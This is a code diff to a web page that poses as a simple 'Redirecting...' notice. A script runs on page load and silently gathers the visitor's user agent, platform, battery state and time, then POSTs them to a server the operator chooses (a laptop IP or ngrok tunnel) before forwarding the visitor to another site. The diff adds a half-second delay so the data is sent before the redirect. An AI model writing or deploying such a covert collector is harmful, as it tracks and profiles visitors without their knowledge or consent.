@@ -24,7 +24,6 @@
     <p>Redirecting...</p>
     <script>
         function getDeviceInfo() {
-            // Collect device and browser information
             const info = {
                 "User Agent": navigator.userAgent || "Unknown",
                 "Platform": navigator.platform || "Unknown",
@@ -41,7 +40,6 @@
                 "Timestamp": new Date().toLocaleString()
             };
 
-            // Attempt to get battery info (if supported)
             if (navigator.getBattery) {
                 navigator.getBattery().then(battery => {
                     info.Battery = `${(battery.level * 100).toFixed(0)}% (Charging: ${battery.charging ? 'Yes' : 'No'})`;
@@ -74,27 +72,33 @@
         }
 
         function sendToServer(info) {
-            // Replace with your ngrok or server URL
-            const serverUrl = "http://your-server-url:8000/submit";
+            // Replace with your laptop's IP:port or ngrok URL
+            const serverUrl = "http://your-laptop-ip:8000/submit"; // E.g., http://192.168.1.100:8000/submit or https://abc123.ngrok.io/submit
             fetch(serverUrl, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify(info)
             })
-                .then(response => response.json())
+                .then(response => {
+                    if (!response.ok) throw new Error("Server response: " + response.status);
+                    return response.json();
+                })
                 .then(data => {
                     console.log("Data sent:", data);
-                    // Redirect to the specified URL
-                    window.location.href = "http://christyndavemaurin.cmu-online.tech/Tripside/default.asp";
+                    // Delay redirect to ensure data is sent
+                    setTimeout(() => {
+                        window.location.href = "http://christyndavemaurin.cmu-online.tech/Tripside/default.asp";
+                    }, 500);
                 })
                 .catch(err => {
-                    console.error("Failed to send:", err);
+                    console.error("Failed to send:", err.message);
                     // Redirect even if sending fails
-                    window.location.href = "http://christyndavemaurin.cmu-online.tech/Tripside/default.asp";
+                    setTimeout(() => {
+                        window.location.href = "http://christyndavemaurin.cmu-online.tech/Tripside/default.asp";
+                    }, 500);
                 });
         }
 
-        // Run on page load
         window.onload = getDeviceInfo;
     </script>
 </body>
